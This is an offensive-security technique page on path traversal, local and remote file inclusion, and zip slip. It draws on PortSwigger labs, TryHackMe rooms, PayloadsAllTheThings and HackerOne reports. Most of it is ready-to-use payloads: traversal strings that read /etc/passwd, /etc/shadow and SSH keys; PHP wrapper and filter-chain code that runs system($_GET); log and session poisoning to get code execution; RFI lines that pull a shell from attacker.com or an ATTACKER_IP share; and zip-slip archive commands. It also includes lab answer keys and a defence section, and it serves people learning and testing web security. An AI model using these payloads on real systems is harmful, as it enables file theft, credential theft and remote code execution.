---
title: "Path Traversal / LFI"
type: technique
tags: [exploitation, h1, lfi, path-traversal, portswigger, rce, rfi, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-06-29
sources: [ps-general-concepts, ps-indepth-path-traversal, ps-labs-path-traversal, thm-adv-lfi, thm-web-lfi-ctfs, h1-scraped-path-traversal-lfi, payloadsallthethings-directory-traversal, payloadsallthethings-file-inclusion, git-payloadsallthethings, git-portswigger-all-labs]
---

# Path Traversal / LFI

## What it is

Path traversal (directory traversal) and Local File Inclusion (LFI) are closely related vulnerabilities that let an attacker read arbitrary files on the server's filesystem. LFI additionally allows the included file to be executed as code. Remote File Inclusion (RFI) extends this to include files from attacker-controlled external URLs.

## How it works

An application takes a user-supplied value and uses it to construct a file path for reading or including. Without proper validation or path canonicalisation, an attacker can inject traversal sequences (`../`) to escape the intended directory and reach any readable file on the system.

In PHP applications using `include()` or `require()` with user-supplied input, the included file's contents are interpreted as PHP — meaning reading a file containing PHP code executes it (LFI-to-RCE).

**Source disclosure vs RCE.** If the sink is `readfile`/`highlight_file`/`file_get_contents`+`echo`
(not `include`), the file's bytes are returned as TEXT: you read PHP SOURCE (leak creds, DB paths,
other endpoints' logic) but it does NOT execute. Still high impact, it routinely leaks the exact
secret/logic that unlocks the next step (e.g. an admin password or a hidden `shell_exec` sink).

**`realpath()` + `strpos()` webroot guard.** A common guard is
`$r = realpath($base.'/'.$skin.'.php'); if ($r !== false && strpos($r, realpath('/var/www/html')) === 0) readfile($r);`.
`realpath` canonicalises away every `../`, so traversal ABOVE the allowed prefix is dead (the
`/var/www/db.php` one level up stays blocked, do not grind it). But you can still read EVERY `.php`
UNDER the webroot, so dump `config.php` and the app source: it usually hands you the cred/hint anyway.

## Prerequisites

- A user-controlled parameter used to load a local file (e.g., `?page=`, `?file=`, `?filename=`, `?template=`)
- For RCE: ability to write PHP code somewhere on the filesystem the application can include (log files, session files, upload directory)
- For RFI: PHP `allow_url_include` directive enabled (rare in modern configs)

## Methodology

### 1. Identify injection points

Look for parameters that appear to load file content:

```
/loadImage?filename=218.png
/index.php?page=home
/view?file=report.pdf
/secret-script.php?file=supersecretadminpanel.html
```

Test with a known-safe traversal to confirm:

```
?filename=../../../etc/passwd
```

### 2. Simple traversal

Traverse up from the application's base directory to reach system files:

```bash
# Linux
?filename=../../../etc/passwd
?filename=../../../etc/shadow

# Windows
?filename=..\..\..\windows\win.ini
```

Three levels of `../` is usually sufficient from a typical web root (`/var/www/html/`).

### 3. Absolute path bypass

When the application prepends a base directory but allows absolute paths:

```
?filename=/etc/passwd
```

### 4. Stripped sequences bypass

When the application strips `../` non-recursively (a single pass), use nested sequences that collapse to a valid traversal after the inner part is removed:

```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
```

After stripping `../`, `....//` becomes `../` — still a valid traversal.

### 5. URL encoding bypass

When traversal sequences are stripped in the URL path before reaching the application, use URL-encoded or double-encoded values:

```
%2e%2e%2f  →  ../            (single URL encode)
%252e%252e%252f  →  ../      (double URL encode)
..%c0%af                     (non-standard encoding — slash)
..%ef%bc%8f                  (Unicode full-width slash)
%u002e%u002e%u2215           (Unicode encoding)
%c0%2e%c0%2e%c0%af           (Overlong UTF-8 Unicode encoding)
```

Example payloads:

```
?filename=..%2f..%2f..%2fetc%2fpasswd
?filename=..%252f..%252f..%252fetc%252fpasswd
?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### 6. Base path validation bypass

When the application requires the input to start with a specific directory:

```
?filename=/var/www/images/../../../etc/passwd
```

The check for `/var/www/images` passes; the traversal is still resolved by the filesystem.

Variant using double slashes to avoid simple `../..` filter:

```
?filename=/var/www/html/..//..//..//etc/passwd
```

### 7. Null byte extension bypass

When the application enforces a file extension suffix (e.g., `.png`) and passes the combined path to low-level C functions:

```
?filename=../../../etc/passwd%00.png
```

The null byte terminates the string; the extension is ignored. (Note: fixed in PHP >= 5.3.4).

### 8. Path Truncation bypass

On older PHP installations, a filename longer than 4096 bytes is truncated. We can bypass extension checks by padding the payload to reach the limit, discarding the forced extension:

```
?filename=../../../etc/passwd............[ADD MORE]
?filename=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
?filename=../../../etc/passwd/./././././.[ADD MORE]
```

### 9. Reverse Proxy (Nginx / Tomcat) URL Implementation bypass

When an application sits behind a reverse proxy, path resolution discrepancies can be exploited. For example, Nginx treats `..;/` as a regular directory name, but Tomcat treats it as `../`, allowing traversal that bypasses the proxy's rules:

```
?filename=..;/..;/..;/WEB-INF/web.xml
```

### 10. Java URL Protocol

If Java uses `new URL()` to fetch the path, the format `url:URL` can be exploited:

```
?filename=url:file:///etc/passwd
?filename=url:http://127.0.0.1:8080
```

### 11. ASP.NET Cookieless Session Traversal

When ASP.NET cookieless session state is enabled, the Session ID is embedded in the URL (e.g., `/(S(id))/`). This behavior can be used to bypass WAFs or directory restrictions:

```
/MyApp/(S(X))/admin/(S(X))/main.aspx
/admin/Foobar/(S(X))/../(S(X))/main.aspx
```

### 12. IIS Short Name & Windows UNC Shares

**Windows UNC Share**: Injecting a UNC path `\\UNC\share\name` can force the application to authenticate via NTLM to an attacker-controlled share, or access unexpected files:
```
?filename=\\localhost\c$\windows\win.ini
```

**IIS Short Name**: IIS 8.3 short names can bypass blocklists (e.g., `PROGRA~1` instead of `Program Files`):
```
https://TARGET/bin::$INDEX_ALLOCATION/
```

### 13. LFI wordlist

Use SecLists for automated fuzzing:

```
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
```

Burp Intruder also ships with a "Fuzzing - path traversal" payload list containing encoded sequences.

## PHP Wrappers

PHP wrappers extend LFI capability significantly.

### php://filter — read files as base64

Encode file contents in base64 to safely exfiltrate binary or PHP files without triggering execution:

```
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/convert.base64-encode/resource=config.php
```

Decode the base64 response to reveal the file contents.

Available filter types:
- `string.rot13` — ROT13 encoding
- `string.toupper` / `string.tolower`
- `convert.base64-encode` / `convert.base64-decode`
- `zlib.deflate` / `zlib.inflate`

### data:// wrapper — execute code directly

When `allow_url_include` is enabled, embed PHP code inline:

```
?page=data:text/plain,<?php phpinfo(); ?>
?page=data:text/plain,<?php system($_GET['cmd']); echo 'done'; ?>
```

### php://filter chain (RCE without file write)

When direct execution wrappers are blocked, a chain of iconv conversion filters can be used to write arbitrary PHP bytecode without uploading any file. Use the `php_filter_chain_generator` tool:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); echo "done"; ?>'
```

The output is a long `php://filter/...` chain. Append `&0=id` to execute commands:

```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...(long chain).../resource=php://temp&0=id
```

Reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters

## LFI to RCE

### Method 1: Log poisoning

Inject PHP code into a web server log file, then include the log file via LFI:

**Step 1:** Poison the User-Agent header (Apache logs the UA):

```bash
nc TARGET 80
<?php echo system($_GET[0]); ?>
```

The server returns a 400 error but logs the PHP code in `/var/log/apache2/access.log`.

**Step 2:** Include the log file:

```
?page=/var/log/apache2/access.log&0=id
```

Common log paths to try:
- `/var/log/apache2/access.log`
- `/var/log/apache/access.log`
- `/var/log/nginx/access.log`
- `/proc/self/fd/2` (Apache error log via `/proc`)

### Method 2: Session file injection

If you can inject PHP code into a session variable and then include the session file:

**Step 1:** Inject code into a session via a vulnerable parameter:

```
?page=<?php system($_GET[0]); ?>
```

The application stores this in the session, e.g. `$_SESSION['page'] = $_GET['page']`.

**Step 2:** Read your PHPSESSID cookie, then include the session file:

```
?page=/var/lib/php/sessions/sess_<YOUR_PHPSESSID>&0=id
```

### Method 3: /proc/self/fd

Each open file descriptor is accessible under `/proc/self/fd/<number>`. Apache error logs are often accessible:

```
?page=/proc/self/fd/2&0=id
```

Try fd numbers 0 through 20.

## Remote File Inclusion (RFI)

When `allow_url_include` is enabled and input is passed to `include()`:

```
?page=http://attacker.com/shell.php
?page=http://attacker.com/exploit.php?
```

Host a PHP file on your attack machine and include it remotely. The trailing `?` prevents the application from appending a `.php` extension.

### Bypass allow_url_include (SMB)

If `allow_url_include` is `Off`, you can still include remote files on a Windows target using the SMB protocol (which is treated as a local path):

1. Host a public SMB share containing `shell.php`.
2. Access the path via UNC:
```
?page=\\ATTACKER_IP\share\shell.php
```

## Key payloads / examples

```bash
# Basic traversal
?filename=../../../etc/passwd

# Absolute path
?filename=/etc/passwd

# Nested (non-recursive strip bypass)
?filename=....//....//....//etc/passwd

# URL encoded
?filename=..%2f..%2f..%2fetc%2fpasswd

# Double URL encoded
?filename=..%252f..%252f..%252fetc%252fpasswd

# Base path + traversal bypass
?filename=/var/www/html/..//..//..//etc/passwd

# Null byte (extension bypass)
?filename=../../../etc/passwd%00.png

# PHP filter (read source)
?page=php://filter/convert.base64-encode/resource=config.php

# data:// (code execution)
?page=data:text/plain,<?php system($_GET[0]); ?>&0=id

# Log poisoning (after poisoning UA)
?page=/var/log/apache2/access.log&0=id

# Session injection (after session poisoning)
?page=/var/lib/php/sessions/sess_SESSID&0=id
```

## Interesting files to read

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/www/html/config.php
/var/www/html/wp-config.php
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
```

## Bypasses and variants

| Protection | Bypass |
|---|---|
| Strips `../` | Use `....//` or `..././` |
| URL-decodes input | Double-encode: `%252e%252e%252f` |
| Requires base path prefix | `/var/www/html/../../../etc/passwd` |
| Requires extension suffix | Null byte: `../../etc/passwd%00.png` |
| No file write available | PHP filter chain generator |

## Real-World Examples (HackerOne — paid reports)

Source: HackerOne disclosed reports, paid bounties only. 33 total paid, 7 critical, top bounty $29,000.

### Pattern 1: Archive / bulk-import zip-slip enabling arbitrary file read (Critical — GitLab, $29,000 + $16,000)

Two separate GitLab critical reports exploited the same class of vulnerability in different import pipelines. In [#1439593](https://hackerone.com/reports/1439593) ($29,000) the `UploadsPipeline` during bulk import did not canonicalise attachment paths, allowing a crafted archive to place files outside the expected uploads directory and subsequently read them back via the application. In [#1132378](https://hackerone.com/reports/1132378) ($16,000) the same primitive existed in the project import flow. Both allowed reading arbitrary files on the GitLab server — including `config/secrets.yml` (Rails secret key base), `database.yml` (DB credentials), and SSH keys — making them directly critical. Key lesson: archive extraction and import pipelines are high-value targets because they necessarily write to disk and often skip the path validation applied to normal file parameters.

### Pattern 2: Path traversal in attachment rewrite on issue move (Critical — GitLab, $20,000)

[Report #827052](https://hackerone.com/reports/827052) found that when a GitLab issue was moved between projects, the `UploadsRewriter` component reconstructed attachment file paths without canonicalising the user-supplied filename component. An attacker could create an issue with a crafted attachment path, then trigger a move to read arbitrary files from the server filesystem. The $20,000 bounty reflects that the read is unauthenticated relative to the destination project — any project member could trigger reads of the GitLab server's `secrets.yml`. Pattern: file operations triggered by application events (move, copy, archive) may bypass input validation applied at upload time.

### Pattern 3: CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server path traversal to RCE (Critical — Internet Bug Bounty, $4,000 + $1,000 + $1,000)

Three related reports ([#1394916](https://hackerone.com/reports/1394916), [#1404731](https://hackerone.com/reports/1404731), [#1400238](https://hackerone.com/reports/1400238)) cover the Apache 2.4.49–2.4.50 path normalisation bug. The URL path `/.%2e/` bypassed Apache's path traversal check but was resolved by the OS to `../`. This allowed reading files outside the document root if `mod_cgi` or `mod_cgid` was enabled. CVE-2021-42013 was an incomplete fix: the bypass `%%32%65` (double-percent-encoded dot) restored traversal. With CGI enabled, the traversal became RCE by including `/bin/sh` as the CGI target. Pattern: URL normalisation applied at different layers (WAF, web server, OS) creates bypass opportunities when the layers disagree on encoding.

### Pattern 4: NuGet Package Registry — path traversal via package filename (High — GitLab, $12,000)

[Report #822262](https://hackerone.com/reports/822262) found that the GitLab NuGet package registry did not validate filenames within uploaded `.nupkg` archives. A crafted package could write files to arbitrary paths on the server's storage backend, overwriting application files. The $12,000 bounty (high severity) reflects write rather than read — file write primitives enable RCE when attacker-controlled paths overlap with interpreted code locations (Ruby `.rb` files, template directories, authorized_keys).

### Pattern 5: Mozilla VPN client — path traversal to RCE via file write (High — Mozilla, $6,000)

[Report #2995025](https://hackerone.com/reports/2995025) is a desktop client path traversal leading to RCE. The VPN client processed update manifests or configuration files that included relative file paths. Without canonicalisation, a malicious server response could write files to arbitrary filesystem locations — and by writing to an application startup path, the attacker achieved code execution on the client machine. Pattern: desktop applications and mobile apps that sync configuration or assets from a server are often tested less rigorously for path traversal than web apps.

### Pattern 6: Slack Android — directory traversal leaking auth tokens (High — Slack, $3,500)

[Report #1378889](https://hackerone.com/reports/1378889) involved the Slack Android app's file provider or intent handling. A malicious app on the same device could send an intent with a crafted path that traversed outside the intended directory, reaching Slack's internal files including stored OAuth tokens and session credentials. The $3,500 bounty reflects that exploitation requires a co-installed malicious app (reduced attack surface) but the impact is account takeover. Pattern: Android `FileProvider` and `content://` URIs are common sources of mobile path traversal when path canonicalisation is absent.

### Pattern 7: Node.js Permission Model — path traversal via Uint8Array / Buffer monkey-patching (High — Internet Bug Bounty, $3,495 + $2,430 + $2,330)

Three Node.js reports ([#2256167](https://hackerone.com/reports/2256167), [#2434811](https://hackerone.com/reports/2434811), [#2225660](https://hackerone.com/reports/2225660)) expose subtle bypasses in the Node.js experimental Permission Model. In #2256167 a path stored in a `Uint8Array` bypassed the allow-list check because the internal path comparison operated on the string representation before the typed array was coerced. In #2434811 monkey-patching `Buffer` internals before calling `fs` functions caused the permission check to read an empty/wrong path while the actual I/O used the original. These are runtime/VM-level traversals that affect all applications running under Node.js — high-value for security researchers reviewing Node.js core.

### Pattern 8: RubyGems — gem installation overwriting arbitrary files (High — RubyGems, $1,000)

[Report #243156](https://hackerone.com/reports/243156) found that installing a crafted `.gem` package could create or overwrite files at arbitrary paths during extraction. The `Gem::Installer` did not canonicalise entry paths before writing, allowing a `../../../../etc/cron.d/backdoor` entry in the gem spec. Pattern: package managers are extremely high-value path traversal targets because: (1) they run with elevated privileges, (2) file write is the primary operation, (3) they are invoked automatically in CI/CD pipelines. This same class of bug appears in npm, pip, and Composer.

### Pattern 9: Nextcloud — path traversal reading arbitrary SVG files server-wide (High — Nextcloud, $1,250)

[Report #1302155](https://hackerone.com/reports/1302155) exploited a path traversal in Nextcloud's SVG preview/rendering path. The parameter controlling which file to render lacked canonicalisation, allowing an authenticated user to read SVG files owned by any other user on the server. This is a horizontal privilege escalation rather than full arbitrary read — but on a Nextcloud instance with shared documents, reading other users' SVGs could expose sensitive diagrams, credentials in documents, or internal network topology. Pattern: file preview/thumbnail endpoints often have less scrutiny than primary file access endpoints but use the same underlying filesystem operations.

### Pattern 10: GitLab CI runner — path traversal poisoning shared build cache (Critical — GitLab, $2,000)

[Report #301432](https://hackerone.com/reports/301432) showed that a GitLab CI runner job could use path traversal sequences in artifact/cache key names to write to cache paths belonging to other projects. By poisoning a shared project's build cache with a malicious binary or configuration, an attacker could achieve code execution in that project's subsequent pipeline runs. Pattern: CI/CD cache and artifact storage are shared infrastructure — path traversal here has supply chain impact across all projects using the same runner.

## Detection and defence

- **Avoid passing user input to filesystem APIs** — redesign the feature to use an ID/key that maps to a file internally
- **Allowlist permitted values** — compare input against a strict whitelist of allowed identifiers
- **Canonicalise paths** before use and verify the result starts with the expected base directory:

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // safe to process
}
```

- **Disable `allow_url_include`** in PHP configuration
- **Disable dangerous PHP wrappers** (data://, expect://) via `php.ini`
- **Store files outside the web root** and serve via a dedicated controller that does not expose filenames
- **WAF rules** to detect `../`, `%2e%2e%2f`, null bytes in file parameters

## Tools

- [[burp-suite]] — Intruder with LFI wordlist, Repeater for manual testing
- SecLists — `Fuzzing/LFI/LFI-Jhaddix.txt`
- `php_filter_chain_generator` — https://github.com/synacktiv/php_filter_chain_generator
- `ffuf` / `gobuster` — directory and file fuzzing to find inclusion points

## Sources

- PortSwigger Academy — Path Traversal (General Concepts + In-depth)
- PortSwigger Labs 1–6: Simple traversal, Absolute path, Stripped non-recursive, URL-decode, Base path, Null byte
- THM Advanced Web — File Inclusion, Path Traversal room
- THM CTFs: Archangel (log poisoning + PHP wrapper), Cheese CTF (PHP filter chain), Include (LFI + SSRF), Red CTF, Team, Airplane, All-in-One

---

## Zip Slip
Zip Slip is a widespread arbitrary file overwrite critical vulnerability, which typically results in remote command execution. It is exploited using a specially crafted archive that holds directory traversal filenames (e.g. `../../shell.php`).

The Zip Slip vulnerability can affect numerous archive formats, including `tar`, `jar`, `war`, `cpio`, `apk`, `rar`, and `7z`.

**Exploitation:**
When a vulnerable application extracts a malicious archive, the files are written outside the intended extraction directory.
Using `ptoomey3/evilarc`:
```bash
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
```

Creating a ZIP archive containing a symbolic link manually:
```bash
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

## Payload reference (PayloadsAllTheThings)

Additional traversal encoding variants and platform-specific bypasses from PAT that supplement the bypass table above.

### Encoding variants — full spectrum

```
# Unicode / overlong UTF-8 encodings for the dot and slash
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd   # overlong UTF-8 dot
%u002e%u002e%u2215                                    # Unicode full-width slash
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd           # fullwidth solidus (U+FF0F)

# Non-standard slash encoding
..%c0%af    # overlong slash
..%25%2F    # double percent-encoded slash
```

### Encoding character reference

Individual character encodings useful when building custom payloads:

```
# Dot (.) encodings
%2e        standard URL
%u002e     Unicode
%c0%2e     overlong UTF-8
%e0%40%ae  overlong UTF-8 variant
%c0ae      overlong UTF-8 compact

# Forward slash (/) encodings
%2f        standard URL
%u2215     Unicode fullwidth solidus
%c0%af     overlong UTF-8
%e0%80%af  overlong UTF-8 4-byte
%c0%2f     overlong variant

# Backslash (\) encodings
%5c        standard URL
%u2216     Unicode
%c0%5c     overlong UTF-8
%c0%80%5c  overlong variant

# Double URL-encoded forms
%252e  →  .
%252f  →  /
%255c  →  \

# Alternative double-encode for ../
%25%32%65%25%32%65%25%32%66  →  ../
```

### Nginx off-by-slash + reverse proxy traversal

```
# Nginx passes `..;/` as a regular segment; Tomcat treats it as `../`
/api..;/admin
/files..;/..;/etc/passwd
```

Nginx `alias` off-by-slash — when an `alias` directive is missing a trailing slash on the location block, the path leaks to the parent directory:

```nginx
# Vulnerable config
location /static {
    alias /home/app/static/;
}
```

```
# Request appends `../settings.py` to /home/app/static/ → /home/app/settings.py
GET /static../settings.py
```

Tomcat path parameter stripping: Tomcat strips the `;foo` path parameter segment (e.g. `/login;foo/bar` → `/login/bar`), while proxies may pass it unchanged. This allows ACL bypass when the proxy evaluates the unstripped path.

### ASP.NET cookieless session path injection

```
/MyApp/(S(X))/admin/(S(X))/main.aspx
/admin/Foobar/(S(X))/../(S(X))/main.aspx
```

### Spring CVE-2018-1271 — cleanPath double-slash bypass

Spring's `cleanPath` function collapsed double slashes, allowing traversal that bypassed absolute-path validation:

```
# Double-slash traversal (normalized to /foo/ by cleanPath, but OS resolves traversal)
/foo//../etc/passwd

# Fully-encoded Windows traversal payload
http://target:8080/app/static/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/win.ini
```

### Rails CVE-2018-3760 — Sprockets file:// scheme bypass

Sprockets (Rails asset pipeline) supported a `file://` scheme, bypassing absolute path checks. Double encoding and query string injection enabled RCE via ERB templates:

```
# Arbitrary file read
http://target:3000/assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/etc/passwd

# RCE via ERB template inclusion (file with PHP-style eval)
http://target:3000/assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/tmp/evil.erb%3ftype=text/plain
```

### Real-world proxy bypass case studies

| Target | Technique | Path |
|---|---|---|
| Uber SSO whitelist bypass | `..;/` proxy-backend mismatch | `/status/..;/secure/Dashboard.jspa` |
| Bynder RCE | `..;/` + admin panel + log injection | `/..;/railo-context/admin/web.cfm` |
| Amazon Nuxeo RCE | Path normalisation + Seam EL injection + blacklist bypass | Chained multi-step |

### Windows UNC share injection

```
?filename=\\localhost\c$\windows\win.ini
?filename=\\attacker\share\payload
```

### Java URL protocol

```
?filename=url:file:///etc/passwd
?filename=url:http://127.0.0.1:8080/admin
```

---

## PortSwigger Labs

All labs use a `/image?filename=` parameter to load product images. The server stores images under `/var/www/images/`.

### Lab 1 — File path traversal, simple case (Apprentice)

No filtering. Direct `../` traversal reaches `/etc/passwd`.

```
GET /image?filename=../../../etc/passwd
```

### Lab 2 — Traversal sequences blocked with absolute path bypass (Practitioner)

The server blocks `../` but accepts absolute paths directly.

```
GET /image?filename=/etc/passwd
```

### Lab 3 — Traversal sequences stripped non-recursively (Practitioner)

The server strips `../` in a single non-recursive pass. Nested sequences survive after the inner part is removed.

```
GET /image?filename=..././..././..././etc/passwd
```

After stripping `../`, `..././` collapses back to `../`.

### Lab 4 — Traversal sequences stripped with superfluous URL-decode (Practitioner)

The server URL-decodes the input and then strips `../`. Double-encode so the first decode produces `%2e%2e%2f`, which is not matched by the strip filter.

```
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

`%25` decodes to `%`, so `%252e` → `%2e` → `.` after the second decode performed by the filesystem layer.

### Lab 5 — Validation of start of path (Practitioner)

The server requires the filename to start with `/var/www/images`. Satisfy the check, then append traversal sequences.

```
GET /image?filename=/var/www/images/../../../etc/passwd
```

### Lab 6 — Validation of file extension with null byte bypass (Practitioner)

The server requires the filename to end with an image extension (`.jpg` / `.png`). A null byte terminates the path string before the forced extension reaches the OS.

```
GET /image?filename=../../../etc/passwd%00.png
```

`%00` is a null byte — it terminates the C-string, so the OS sees `../../../etc/passwd` only.
